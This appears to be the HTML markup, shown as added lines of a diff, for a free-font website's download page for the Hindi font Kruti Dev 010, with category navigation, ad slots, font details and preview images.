+<div id="main" class="wsb">
+	<div class="grid cols cnt pr griddesign_ffonts">
+		<div class="ut-t w-5" id="sidebar">
+					<div class="sbarctrl cf">
+						<div class="fr"><a href="#" id="stgl"><i class="icon ui-close sz30">Close</i></a></div>
+					</div>		
+<ul class="s15 catlist classicalfonts_sidebarcss">
+<li class="s10">&nbsp;</li>
+<li><a href="https://www.WhatFontIs.com" title="What Font Is" class="category_title_sidebar">What Font Is</a></li>
+<li><a href="/instagram-fonts-generator.html" title="Instagram Fonts" class="category_title_sidebar">♥ Instagram Fonts</a></li>
+<li><a href="/cursive-fonts-generator.html" title="Cursive Text Generator" class="category_title_sidebar">♡ Cursive Text Generator</a></li>
+</ul>
+<div class="bordersidebaradds"></div>
+
+<ul class="s15 catlist classicalfonts_sidebarcss">
+	
+<li><a href="/3D.html"  title="3D Fonts">3D Fonts</a><span class="circled blk">298</span></li><li><a href="/50s.html"  title="50s Fonts">50s Fonts</a><span class="circled blk">36</span></li><li><a href="/60s.html"  title="60s Fonts">60s Fonts</a><span class="circled blk">5</span></li><li><a href="/80s.html"  title="80s Fonts">80s Fonts</a><span class="circled blk">6</span></li><li><a href="/Antiques.html"  title="Antiques Fonts">Antiques Fonts</a><span class="circled blk">47</span></li><li><a href="/Art-Deco.html"  title="Art Deco Fonts">Art Deco Fonts</a><span class="circled blk">25</span></li><li><a href="/Art-Nouveau.html"  title="Art Nouveau Fonts">Art Nouveau Fonts</a><span class="circled blk">37</span></li><li><a href="/Asian.html"  title="Asian Fonts">Asian Fonts</a><span class="circled blk">551</span></li><li><a href="/athletic.html"  title="Athletic Fonts">Athletic Fonts</a><span class="circled blk">36</span></li><li><a href="/Basic.html"  title="Basic Fonts">Basic Fonts</a><span class="circled blk">287</span></li><li><a href="/Broken.html"  title="Broken Fonts">Broken Fonts</a><span class="circled blk">296</span></li><li><a href="/bubble-letter.html"  title="Bubble Letter Fonts">Bubble Letter Fonts</a><span class="circled blk">100</span></li><li><a href="/Calligraphic.html"  title="Calligraphic Fonts">Calligraphic Fonts</a><span class="circled blk">275</span></li><li><a href="/Capitals.html"  title="Capitals Fonts">Capitals Fonts</a><span class="circled blk">665</span></li><li><a href="/Cars.html"  title="Cars Fonts">Cars Fonts</a><span class="circled blk">27</span></li><li><a href="/Cartoon.html"  title="Cartoon Fonts">Cartoon Fonts</a><span class="circled blk">3964</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Christmas-Xmas.html"  title="Christmas (Xmas) Fonts">Christmas (Xmas) Fonts</a><span class="circled blk">395</span></li><li><a href="/Classic.html"  title="Classic Fonts">Classic Fonts</a><span class="circled blk">38</span></li><li><a href="/Comic.html"  title="Comic Fonts">Comic Fonts</a><span class="circled blk">1738</span></li></ul>
+					<div class="t2 b1">
+					
+					</div>	
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Computer.html"  title="Computer Fonts">Computer Fonts</a><span class="circled blk">60</span></li><li><a href="/Crazy.html"  title="Crazy Fonts">Crazy Fonts</a><span class="circled blk">1051</span></li><li><a href="/Curly.html"  title="Curly Fonts">Curly Fonts</a><span class="circled blk">332</span></li><li><a href="/Decorative.html"  title="Decorative Fonts">Decorative Fonts</a><span class="circled blk">5194</span></li><li><a href="/Dingbats.html"  title="Dingbats Fonts">Dingbats Fonts</a><span class="circled blk">2261</span></li><li><a href="/Distorted-Eroded.html"  title="Distorted Eroded Fonts">Distorted Eroded Fonts</a><span class="circled blk">2314</span></li><li><a href="/Dotted.html"  title="Dotted Fonts">Dotted Fonts</a><span class="circled blk">290</span></li><li><a href="/Drippy.html"  title="Drippy Fonts">Drippy Fonts</a><span class="circled blk">77</span></li><li><a href="/Easter.html"  title="Easter Fonts">Easter Fonts</a><span class="circled blk">350</span></li><li><a href="/Famous.html"  title="Famous Fonts">Famous Fonts</a><span class="circled blk">77</span></li><li><a href="/Fancy.html"  title="Fancy Fonts">Fancy Fonts</a><span class="circled blk">774</span></li><li><a href="/Farsi.html"  title="Farsi Fonts">Farsi Fonts</a><span class="circled blk">29</span></li><li><a href="/Foreign.html"  title="Foreign Fonts">Foreign Fonts</a><span class="circled blk">15</span></li><li><a href="/Formal.html"  title="Formal Fonts">Formal Fonts</a><span class="circled blk">434</span></li><li><a href="/Funky.html"  title="Funky Fonts">Funky Fonts</a><span class="circled blk">6</span></li><li><a href="/Futuristic.html"  title="Futuristic Fonts">Futuristic Fonts</a><span class="circled blk">2091</span></li><li><a href="/Gothic.html"  title="Gothic Fonts">Gothic Fonts</a><span class="circled blk">1120</span></li><li><a href="/Graffiti.html"  title="Graffiti Fonts">Graffiti Fonts</a><span class="circled blk">262</span></li><li><a href="/Halloween.html"  title="Halloween Fonts">Halloween Fonts</a><span class="circled blk">198</span></li><li><a href="/Handwritten.html"  title="Handwritten Fonts">Handwritten Fonts</a><span class="circled blk">4083</span></li><li><a href="/Hi-tech.html"  title="Hi-tech Fonts">Hi-tech Fonts</a><span class="circled blk">9</span></li><li><a href="/Hindi.html"  title="Hindi Fonts">Hindi Fonts</a><span class="circled blk">55</span></li><li><a href="/Holiday.html"  title="Holiday Fonts">Holiday Fonts</a><span class="circled blk">16</span></li><li><a href="/Horror.html"  title="Horror Fonts">Horror Fonts</a><span class="circled blk">562</span></li><li><a href="/Images-Symbols.html"  title="Images &amp; Symbols Fonts">Images &amp; Symbols Fonts</a><span class="circled blk">736</span></li><li><a href="/Industrial.html"  title="Industrial Fonts">Industrial Fonts</a><span class="circled blk">14</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Kids.html"  title="Kids Fonts">Kids Fonts</a><span class="circled blk">236</span></li><li><a href="/Messy.html"  title="Messy Fonts">Messy Fonts</a><span class="circled blk">28</span></li><li><a href="/Military.html"  title="Military Fonts">Military Fonts</a><span class="circled blk">190</span></li><li><a href="/Miscellaneous.html"  title="Miscellaneous Fonts">Miscellaneous Fonts</a><span class="circled blk">6</span></li><li><a href="/Modern.html"  title="Modern Fonts">Modern Fonts</a><span class="circled blk">458</span></li><li><a href="/Movie.html"  title="Movie Fonts">Movie Fonts</a><span class="circled blk">57</span></li><li><a href="/Musical.html"  title="Musical Fonts">Musical Fonts</a><span class="circled blk">11</span></li><li><a href="/Non-Latin.html"  title="Non-Latin Fonts">Non-Latin Fonts</a><span class="circled blk">37</span></li><li><a href="/Old-fashioned.html"  title="Old Fashioned Fonts">Old Fashioned Fonts</a><span class="circled blk">197</span></li><li><a href="/Outline.html"  title="Outline Fonts">Outline Fonts</a><span class="circled blk">615</span></li><li><a href="/Pixel.html"  title="Pixel Fonts">Pixel Fonts</a><span class="circled blk">836</span></li><li><a href="/Professional.html"  title="Professional Fonts">Professional Fonts</a><span class="circled blk">15</span></li><li><a href="/Quirky.html"  title="Quirky Fonts">Quirky Fonts</a><span class="circled blk">495</span></li><li><a href="/Regular.html"  title="Regular Fonts">Regular Fonts</a><span class="circled blk">15245</span></li><li><a href="/Retro.html"  title="Retro Fonts">Retro Fonts</a><span class="circled blk">715</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Rock.html"  title="Rock Fonts">Rock Fonts</a><span class="circled blk">6</span></li><li><a href="/Round.html"  title="Round Fonts">Round Fonts</a><span class="circled blk">115</span></li><li><a href="/Sans-Serif.html"  title="Sans Serif Fonts">Sans Serif Fonts</a><span class="circled blk">2114</span></li><li><a href="/Sci-fi.html"  title="Sci-fi Fonts">Sci-fi Fonts</a><span class="circled blk">1883</span></li><li><a href="/Script.html"  title="Script Fonts">Script Fonts</a><span class="circled blk">1452</span></li><li><a href="/Serif.html"  title="Serif Fonts">Serif Fonts</a><span class="circled blk">990</span></li><li><a href="/sports.html"  title="Sports Fonts">Sports Fonts</a><span class="circled blk">128</span></li><li><a href="/Stencil.html"  title="Stencil Fonts">Stencil Fonts</a><span class="circled blk">175</span></li><li><a href="/Stylish.html"  title="Stylish Fonts">Stylish Fonts</a><span class="circled blk">10</span></li><li><a href="/Technical.html"  title="Technical Fonts">Technical Fonts</a><span class="circled blk">39</span></li><li><a href="/TV-show.html"  title="TV Show Fonts">TV Show Fonts</a><span class="circled blk">21</span></li><li><a href="/Typewriter.html"  title="Typewriter Fonts">Typewriter Fonts</a><span class="circled blk">676</span></li><li><a href="/Uncategorized.html"  title="Uncategorized Fonts">Uncategorized Fonts</a><span class="circled blk">110737</span></li><li><a href="/Valentine.html"  title="Valentine&#039;s Day Fonts">Valentine&#039;s Day Fonts</a><span class="circled blk">2364</span></li><li><a href="/Wavy.html"  title="Wavy Fonts">Wavy Fonts</a><span class="circled blk">9</span></li></ul>
+<ul class="s15 catlist classicalfonts_sidebarcss"><li><a href="/Web-20.html"  title="Web 2.0 Fonts">Web 2.0 Fonts</a><span class="circled blk">55</span></li><li><a href="/Western.html"  title="Western Fonts">Western Fonts</a><span class="circled blk">101</span></li><li><a href="/Wild.html"  title="Wild Fonts">Wild Fonts</a><span class="circled blk">4</span></li><li><a href="/Wood.html"  title="Wood Fonts">Wood Fonts</a><span class="circled blk">12</span></li><li><a href="/top-fonts.html" title="Top Fonts">Top Fonts</a></li><li><a href="/new-fonts.html" title="New Free Fonts">New Free Fonts</a></li><li><a href="/top-trends.html" title="Trending Fonts">Trending Fonts</a></li>
+	
+<li class="s12 caps lite red t2"><a href="/"><i class="icon ui-fcr sz22"></i>&nbsp;<strong>171,277</strong> Fonts</a></li>
+<li class="s12 caps lite red t2"><a href="/"><i class="icon ui-dcr sz22"></i>&nbsp;<strong>139,657,724</strong> Downloads</a></li>
+
+</ul>	
+
+
+<div class="adbanner1_sidebar">
+	<!-- Tag ID: ffonts_left_rail -->
+<div align="center" data-freestar-ad="__300x600" id="ffonts_left_rail">
+  <script data-cfasync="false" type="text/javascript">
+    freestar.config.enabled_slots.push({ placementName: "ffonts_left_rail", slotId: "ffonts_left_rail" });
+  </script>
+</div>
+</div>
+
+<div class="bordersidebaradds"></div>
+
+<a href="/new-fonts.html" title="New Free Fonts"><p class="category_title_sidebar commercialfontscss">New Free Fonts</p></a>
+<ul class="s15 catlist classicalfonts_sidebarcss">
+	<li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Girl-lova.font" title="Girl lova Font">Girl lova</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Maximum-Profit.font" title="Maximum Profit Font">Maximum Profit</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Berthylda-Wilonalis.font" title="Berthylda Wilonalis Font">Berthylda Wilonalis</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Bright-Sunshine.font" title="Bright Sunshine Font">Bright Sunshine</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Setubal.font" title="Setubal Font">Setubal</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/School-Yard.font" title="School Yard Font">School Yard</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Sacarik.font" title="Sacarik Font">Sacarik</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/NCL-Oesbeq-Boopsy-Demo.font" title="NCL Oesbeq Boopsy Demo Font">NCL Oesbeq Boopsy Demo</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Onether.font" title="Onether Font">Onether</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Helpful.font" title="Helpful Font">Helpful</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/ROBIMA-MERTTHA-SANS-SERIF.font" title="ROBIMA MERTTHA SANS SERIF Font">ROBIMA MERTTHA SANS SERIF</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/ROBIMA-MERTTHA-SCRIPT.font" title="ROBIMA MERTTHA SCRIPT Font">ROBIMA MERTTHA SCRIPT</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Pandora-Rogtars.font" title="Pandora Rogtars Font">Pandora Rogtars</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Ronsttom-Dollast.font" title="Ronsttom Dollast Font">Ronsttom Dollast</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Gabriela-Smithasa.font" title="Gabriela Smithasa Font">Gabriela Smithasa</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Laundry.font" title="Laundry Font">Laundry</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Glavia-DEMO-Regular.font" title="Glavia DEMO Regular Font">Glavia DEMO Regular</a></li><li><i class="icon ui-rag sz22"></i>&nbsp;<a href="/Joilway-DEMO-Regular.font" title="Joilway DEMO Regular Font">Joilway DEMO Regular</a></li>
+</ul>
+
+
+	<div class="bordersidebaradds"></div>
+	<div class="adbanner1_sidebar" style="position: -webkit-sticky;position: sticky;top: 100px;">
+		<!-- Tag ID: ffonts_left_rail_2 -->
+<div align="center" data-freestar-ad="__300x600" id="ffonts_left_rail_2">
+  <script data-cfasync="false" type="text/javascript">
+    freestar.config.enabled_slots.push({ placementName: "ffonts_left_rail_2", slotId: "ffonts_left_rail_2" });
+  </script>
+</div>
+	</div>
+
+
+</div>
+<!--left ends-->
+	<div class="ut-t w-11 vis" id="content"  style="max-width:780px">
+				<div class="adbanner1_sidebar">
+					
+					
+					<!-- Tag ID: ffonts_leaderboard_top -->
+<div align="center" data-freestar-ad="__300x100 __728x90" id="ffonts_leaderboard_top">
+  <script data-cfasync="false" type="text/javascript">
+    freestar.config.enabled_slots.push({ placementName: "ffonts_leaderboard_top", slotId: "ffonts_leaderboard_top" });
+  </script>
+</div>
+				</div>
+<div class="mt-5 mt-md-0">
+</div>
+<!-- Kruti Dev 010 Font download -->  
+				
+
+<div class="breadcrumbs">
+    <a href="https://www.ffonts.net" class="freefontsbreadcrumblink">Fonts</a>
+    <span class="webfontsbreadcrumb s24"> / <a href="/Hindi.html" class="freefontsbreadcrumblink" title="Hindi">Hindi</a></span><span class="webfontsbreadcrumb s24"> / <a href="/Kruti-Dev-010.font" title="Kruti Dev 010" class="freefontsbreadcrumblink">Kruti Dev 010</a></span>
+    <span class="webfontsbreadcrumb">/</span>
+    <h1 class="fontcss_category inline">Kruti Dev 010 Font Download</h1>
+</div>
+
+
+<div class="p402_premium">
+<p class="s18 t2">
+<b>Your download will start in 20 seconds... If not, try the following links:</b><br />
+ <br />
+<a href="/Kruti-Dev-010.font.zip" class="butn red s10 caps downloadbuttonthirdcolumns urlcustomheadercss" style="background:#bc1f1f !important;" title="download Fonts" id="fulldownloadid" onclick="gtag('event', 'click', {'event_category': 'CLICKDOWNLOAD','event_label': 'Clicklink1','value': ''});">Download Link</a>
+                <span class="s10">Zip Archive</span> 
+                <A HREF="#" onclick="if (prompt('Do you want to report this link as broken? (Anti-Spam) What is 12 + 5? :')==17) { OpenWindow('/9675/1','name', '300', '300','yes'); } return false" target="_blank" rel="nofollow" class="s10"><span class="lgr">Report broken link</span></a> <br /><br /><br />
+ 
+</p>
+</div>
+
+<hr>
+<style>
+.CTA{
+ font-weight:normal;
+border-radius:5px !important;
+background-color: #ED3B58;
+border: none;
+border-radius:0px;
+font-weight:500;
+color: #ffffff;
+text-align: center;
+margin-top:10px;
+margin-left:5px;
+font-size: 16px;
+height:50px;
+width: 230px;
+cursor: pointer;
+padding: 12px 6px 12px 6px;
+font-family:Montserrat,sans-serif;
+margin:0 auto;
+text-transform:uppercase;
+margin-top:10px;
+}
+
+.CTA:hover{
+  flex:1 0 auto;
+  transition:all .25s ease-in-out;
+  transform:scale(1.05);
+  cursor:hand;
+}
+</style>
+
+
+					<p class="t1 s18 s18 tdu infofont_css">Description</p>
+					<!-- Tag ID: ffonts_leaderboard_incontent_2 -->
+<div align="center" data-freestar-ad="__728x250" id="ffonts_leaderboard_incontent_2">
+  <script data-cfasync="false" type="text/javascript">
+    freestar.config.enabled_slots.push({ placementName: "ffonts_leaderboard_incontent_2", slotId: "ffonts_leaderboard_incontent_2" });
+  </script>
+</div>
+					<ul class="t2 s18 itemsfontcss">
+						<li><span class="s18 detailsfontscss"> </span></li>
+						<li><span class="s18 detailsfontscss">k010.TTF </span></li>
+						<li><span class="s18 detailsfontscss"><b>Font:</b></span><h2> Kruti Dev 010  </h2></li>
+						<li><span class="s18 detailsfontscss"><b>Weight:</b></span> Regular </li>
+
+						<li><span class="s18 detailsfontscss"><b>Version:</b></span> Version 1.0 Fri Apr 04 03:37:16 1997</li>
+						<li><span class="s18 detailsfontscss"><b>No. of Characters::</b></span> 198</li>
+
+						<li><span class="s18 detailsfontscss"><b>Encoding Scheme:</b></span> </li>
+						<li><span class="s18 detailsfontscss"><b>Is Fixed Pitch:</b></span> No</li>
+					</ul>
+					<p class="t2 s13"><span class="s13">Characters:</span><br><span class="glyphs_spec"> </span>  <span class="glyphs_spec">!</span>  <span class="glyphs_spec">#</span>  <span class="glyphs_spec">$</span>  <span class="glyphs_spec">%</span>  <span class="glyphs_spec">(</span>  <span class="glyphs_spec">)</span>  <span class="glyphs_spec">*</span>  <span class="glyphs_spec">+</span>  <span class="glyphs_spec">,</span>  <span class="glyphs_spec">-</span>  <span class="glyphs_spec">.</span>  <span class="glyphs_spec">/</span>  <span class="glyphs_spec">0</span>  <span class="glyphs_spec">1</span>  <span class="glyphs_spec">2</span>  <span class="glyphs_spec">3</span>  <span class="glyphs_spec">4</span>  <span class="glyphs_spec">5</span>  <span class="glyphs_spec">6</span>  <span class="glyphs_spec">7</span>  <span class="glyphs_spec">8</span>  <span class="glyphs_spec">9</span>  <span class="glyphs_spec">:</span>  <span class="glyphs_spec">;</span>  <span class="glyphs_spec">=</span>  <span class="glyphs_spec">?</span>  <span class="glyphs_spec">@</span>  <span class="glyphs_spec">A</span>  <span class="glyphs_spec">B</span>  <span class="glyphs_spec">C</span>  <span class="glyphs_spec">D</span>  <span class="glyphs_spec">E</span>  <span class="glyphs_spec">F</span>  <span class="glyphs_spec">G</span>  <span class="glyphs_spec">H</span>  <span class="glyphs_spec">I</span>  <span class="glyphs_spec">J</span>  <span class="glyphs_spec">K</span>  <span class="glyphs_spec">L</span>  <span class="glyphs_spec">M</span>  <span class="glyphs_spec">N</span>  <span class="glyphs_spec">O</span>  <span class="glyphs_spec">P</span>  <span class="glyphs_spec">Q</span>  <span class="glyphs_spec">R</span>  <span class="glyphs_spec">S</span>  <span class="glyphs_spec">T</span>  <span class="glyphs_spec">U</span>  <span class="glyphs_spec">V</span>  <span class="glyphs_spec">W</span>  <span class="glyphs_spec">X</span>  <span class="glyphs_spec">Y</span>  <span class="glyphs_spec">Z</span>  <span class="glyphs_spec">[</span>  <span class="glyphs_spec"></span>  <span class="glyphs_spec">]</span>  <span class="glyphs_spec">^</span>  <span class="glyphs_spec">_</span></p>
+					<hr>
+					<section class="t3">
+						<span class="s20 red caps lite">UPPERCASE</span>
+						<div class="fpreview">
+							<img src="https://d144mzi0q5mijx.cloudfront.net/img/K/R/Kruti-Dev-010A.webp" class="lazy" data-src="https://d144mzi0q5mijx.cloudfront.net/img/K/R/Kruti-Dev-010A.webp" alt="Kruti Dev 010 Font UPPERCASE"  />
+						</div>
+					</section>
+					<hr>
+<div style="float:center;">
+<div style="float:left;">
+<!-- Tag ID: ffonts_leaderboard_incontent_1 -->
+<div align="center" data-freestar-ad="__728x250" id="ffonts_leaderboard_incontent_1">
+  <script data-cfasync="false" type="text/javascript">
+    freestar.config.enabled_slots.push({ placementName: "ffonts_leaderboard_incontent_1", slotId: "ffonts_leaderboard_incontent_1" });
+  </script>
+</div>
+</div>
+</div>	
+					<section class="t3">
+						<span class="s20 red caps lite">LOWERCASE</span>
+						<div class="fpreview">
+							<img src="https://d144mzi0q5mijx.cloudfront.net/img/K/R/Kruti-Dev-010a.webp" class="lazy" data-src="https://d144mzi0q5mijx.cloudfront.net/img/K/R/Kruti-Dev-010a.webp" alt="Kruti Dev 010 Font LOWERCASE"  />
+						</div>
+					</section>	
+<ul class="fontlist1"></ul><h3 class="s32 red downloadfreefontstitle">Download Free Fonts</h3><ul class="fontlist1">
+				<li class="cardthirdgridlayoutbox firstfontborder">
+						<div class="ut">
+							<span class="s26 caps fontcss_category"><a href="/DevLys-010.font" title="DevLys 010" onclick="gtag('event', 'click', {'event_category': 'CLICKSIMILAR','event_label': 'ClickTitle','value': ''});">DevLys 010</a></span>
+						</div>
+
+				</li>
+				
+						
+				<li class="cardthirdgridlayoutbox lastfontinlistnoborder">
+						<div class="ut">
+							<span class="s26 caps fontcss_category"><a href="/Arjun.font" title="Arjun" onclick="gtag('event', 'click', {'event_category': 'CLICKSIMILAR','event_label': 'ClickTitle','value': ''});">Arjun</a></span>
+						</div>
+
+				</li>
+				
+						</ul><h4 class="s32 red downloadfreefontstitle">Commercial Fonts Fonts</h4><ul class="fontlist1">
+				<li class="cardthirdgridlayoutbox firstfontborder">
+						<div class="ut">
+							<span class="s26 caps fontcss_category"><a href="https://www.whatfontis.com/NMY_Shelf-Tags-JNL.font" target="_blank" rel="noopener" title="Shelf Tags JNL" onclick="gtag('event', 'click', {'event_category': 'CLICKSIMILAR','event_label': 'ClickTitle','value': ''});">Shelf Tags JNL</a></span>
+						</div>
+
+				</li>
+				
+						
+				<li class="cardthirdgridlayoutbox lastfontinlistnoborder">
+						<div class="ut">
+							<span class="s26 caps fontcss_category"><a href="https://www.whatfontis.com/NFC_Sixties-Living-Regular.font" target="_blank" rel="noopener" title="Sixties Living Regular" onclick="gtag('event', 'click', {'event_category': 'CLICKSIMILAR','event_label': 'ClickTitle','value': ''});">Sixties Living Regular</a></span>
+						</div>
+
+				</li>
+				
+						</ul>
+				<div class="adbanner1_sidebar">
+					
+				</div>
+	</div>
+	
+
+<div class="ut-t w-5" style="background: #fff !important;  min-width:350px;" id="sidebar_right">		
+<div class="adbanner1_sidebar" style="position: -webkit-sticky;position: sticky;top: 100px;">
+
+</div>
+</div>
+
+	</div>
+</div>
+
+
+<footer class="page-footer font-small indigo">
+	<ul class="tac ac" style="display: flex;flex-wrap: wrap;align-items: center;justify-content: center;gap: 16px;">
+	<li><a href="/0.html"  title="0 Fonts" class="s28" >&nbsp;&nbsp;0&nbsp;&nbsp;</a></li><li><a href="/A.html"  title="A Fonts" class="s28" >&nbsp;&nbsp;A&nbsp;&nbsp;</a></li><li><a href="/B.html"  title="B Fonts" class="s28" >&nbsp;&nbsp;B&nbsp;&nbsp;</a></li><li><a href="/C.html"  title="C Fonts" class="s28" >&nbsp;&nbsp;C&nbsp;&nbsp;</a></li><li><a href="/D.html"  title="D Fonts" class="s28" >&nbsp;&nbsp;D&nbsp;&nbsp;</a></li><li><a href="/E.html"  title="E Fonts" class="s28" >&nbsp;&nbsp;E&nbsp;&nbsp;</a></li><li><a href="/F.html"  title="F Fonts" class="s28" >&nbsp;&nbsp;F&nbsp;&nbsp;</a></li><li><a href="/G.html"  title="G Fonts" class="s28" >&nbsp;&nbsp;G&nbsp;&nbsp;</a></li><li><a href="/H.html"  title="H Fonts" class="s28" >&nbsp;&nbsp;H&nbsp;&nbsp;</a></li><li><a href="/I.html"  title="I Fonts" class="s28" >&nbsp;&nbsp;I&nbsp;&nbsp;</a></li><li><a href="/J.html"  title="J Fonts" class="s28" >&nbsp;&nbsp;J&nbsp;&nbsp;</a></li><li><a href="/K.html"  title="K Fonts" class="s28" >&nbsp;&nbsp;K&nbsp;&nbsp;</a></li><li><a href="/L.html"  title="L Fonts" class="s28" >&nbsp;&nbsp;L&nbsp;&nbsp;</a></li><li><a href="/M.html"  title="M Fonts" class="s28" >&nbsp;&nbsp;M&nbsp;&nbsp;</a></li><li><a href="/N.html"  title="N Fonts" class="s28" >&nbsp;&nbsp;N&nbsp;&nbsp;</a></li><li><a href="/O.html"  title="O Fonts" class="s28" >&nbsp;&nbsp;O&nbsp;&nbsp;</a></li><li><a href="/P.html"  title="P Fonts" class="s28" >&nbsp;&nbsp;P&nbsp;&nbsp;</a></li><li><a href="/Q.html"  title="Q Fonts" class="s28" >&nbsp;&nbsp;Q&nbsp;&nbsp;</a></li><li><a href="/R.html"  title="R Fonts" class="s28" >&nbsp;&nbsp;R&nbsp;&nbsp;</a></li><li><a href="/S.html"  title="S Fonts" class="s28" >&nbsp;&nbsp;S&nbsp;&nbsp;</a></li><li><a href="/T.html"  title="T Fonts" class="s28" >&nbsp;&nbsp;T&nbsp;&nbsp;</a></li><li><a href="/U.html"  title="U Fonts" class="s28" >&nbsp;&nbsp;U&nbsp;&nbsp;</a></li><li><a href="/V.html"  title="V Fonts" class="s28" >&nbsp;&nbsp;V&nbsp;&nbsp;</a></li><li><a href="/W.html"  title="W Fonts" class="s28" >&nbsp;&nbsp;W&nbsp;&nbsp;</a></li><li><a href="/X.html"  title="X Fonts" class="s28" >&nbsp;&nbsp;X&nbsp;&nbsp;</a></li><li><a href="/Y.html"  title="Y Fonts" class="s28" >&nbsp;&nbsp;Y&nbsp;&nbsp;</a></li><li><a href="/Z.html"  title="Z Fonts" class="s28" >&nbsp;&nbsp;Z&nbsp;&nbsp;</a></li> 
+	</ul>
+	<!-- Footer Links -->
+	<div class="container footercontainer">	
+  
+	  <!-- Grid row -->
+	  <div class="row footer_rowgrid">
+  
+		<!-- Grid column -->
+		<div class="col-md-3 col-lg-2 mx-auto">
+  
+			<a href="/"><img src="https://d144mzi0q5mijx.cloudfront.net/images/spacer.gif" data-src="https://d144mzi0q5mijx.cloudfront.net/test/images/footer-logo-ffonts.png" class="lazy" rel="noreferrer" alt="FFonts logo" style="width:192px;height:33px;"></a>
+			<p class="s12 descfooter_text">
+				FFONTS <br>
+				&copy;2009&ndash;2026 FFonts.net
+				
+			</p>
+
+			<div class="col-lg-12" style="padding: 0;">
+				<a href="https://www.WhatFontis.com" title="What Font Is"><img src="https://d144mzi0q5mijx.cloudfront.net/images/spacer.gif" data-src="https://d144mzi0q5mijx.cloudfront.net/test/images/whatfontislogo.svg" class="logowft lazy" alt="WhatFontIs logo"></a>
+			</div>
+	
+			<div class="col-lg-12" style="padding: 0;">
+				<a href="/instagram-fonts-generator.html" ><img src="https://d144mzi0q5mijx.cloudfront.net/images/spacer.gif" data-src="https://d144mzi0q5mijx.cloudfront.net/test/images/instagram.png" class="logoinstfooter lazy" alt="Instagram Fonts" ></a>
+			</div>
+  
+		</div>
+		<!-- Grid column -->
+  
+		<hr class="clearfix w-100 d-md-none">
+  
+		<!-- Grid column -->
+		<div class="col-md-6 col-lg-7 mx-auto">
+  
+		  <!-- Links -->
+			<ul class="nvlist linksfootersecondrow">
+		  
+				<li><a href="https://www.ffonts.net" title="Free Fonts" class="s26">Free Fonts</a></li>
+				<li><a href="/new-fonts.html" title="New Free Fonts" class="s26">New Free Fonts</a></li>
+				<li><a href="/top-fonts.html" title="Top Fonts" class="s26">Top Fonts</a></li>
+				<li><a href="/last-30-days.html" title="Last 30 days fonts" class="s26">Last 30 days fonts</a></li>
+				<li><a href="/category.html" title="Themes/Category Fonts" class="s26">Themes/Category Fonts</a></li>
+			</ul>	
+			<ul class="nvlist linksfootersecondrow">
+				<li><br></li>
+			</ul>	
+			<ul class="nvlist linksfootersecondrow">
+				<li><a href="/font-video.html" title="Font Video" class="s26">Font Video</a></li>
+				<li><a href="/instagram-fonts-generator.html" title="Instagram Fonts" class="s26">Instagram Fonts</a></li>
+			</ul>	
+			<ul class="nvlist linksfootersecondrow">
+				<li><br></li>
+			</ul>	
+			<ul class="nvlist linksfootersecondrow">
+				<li><a href="/contact.html" title="Contact us" class="s26">Contact us</a></li>
+				<li><a href="/link-to-us.html" title="Link To Us" class="s26">Link To Us</a></li>
+				<li><a href="/terms.html" title="Terms" class="s26">Terms</a></li>
+				<li><a href="/faq.html" title="FAQ | Install & Download Fonts | FFonts.net" class="s26">&nbsp;FAQ | Install & Download Fonts | FFonts.net&nbsp;</a></li>
+				<li>  <!-- HTML for geo depending button --><button id="pmLink" class="butn red s10 caps downloadbuttonthirdcolumns urlcustomheadercss fontpage_css_general">Privacy Manager</button></li>
+			</ul>
+
+		<ul class="nvlist s11 lite lang lazy-background visible languagesfooter_icons">
+				<li><a href="//www.ffonts.net/" class="s28" title="English"><i class="icon-fl flag-gb sz16">EN</i>En<span>glish</span></a></li>
+				<li><a href="//de.ffonts.net/" class="s28" title="Deutch"><i class="icon-fl flag-de sz16">DE</i>De<span>utch</span></a></li>
+				<li><a href="//es.ffonts.net/" class="s28" title="Espanol"><i class="icon-fl flag-es sz16">ES</i>Es<span>panol</span></a></li>
+				<li><a href="//ro.ffonts.net/" class="s28" title="Romana"><i class="icon-fl flag-ro sz16">RO</i>Ro<span>mana</span></a></li>
+				<li><a href="//fr.ffonts.net/" class="s28" title="Francais"><i class="icon-fl flag-fr sz16">FR</i>Fr<span>ancais</span></a></li>
+				<li><a href="//it.ffonts.net/" class="s28" title="Italiano"><i class="icon-fl flag-it sz16">IT</i>It<span>aliano</span></a></li>
+				<li><a href="//pt.ffonts.net/" class="s28" title="Portuguese"><i class="icon-fl flag-pr sz16">PR</i>Por<span>tuguese</span></a></li>
+				<li><a href="//cn.ffonts.net/" class="s28" title="Chinese"><i class="icon-fl flag-ch sz16">CH</i>Ch<span>inese</span></a></li>
+				<li><a href="//ru.ffonts.net/" class="s28" title="Russian"><i class="icon-fl flag-ru sz16">RU</i>Ru<span>ssian</span></a></li>
+				<li><a href="//ar.ffonts.net/" class="s28" title="Arabic"><i class="icon-fl flag-ar sz16">AR</i>Ar<span>abic</span></a></li>
+				<li><a href="//jp.ffonts.net/" class="s28" title="Japanese"><i class="icon-fl flag-jp sz16">JP</i>Jap<span>anese</span></a></li>
+				<li><a href="//in.ffonts.net/" class="s28" title="Indian"><i class="icon-fl flag-in sz16">IN</i>In<span>dian</span></a></li>
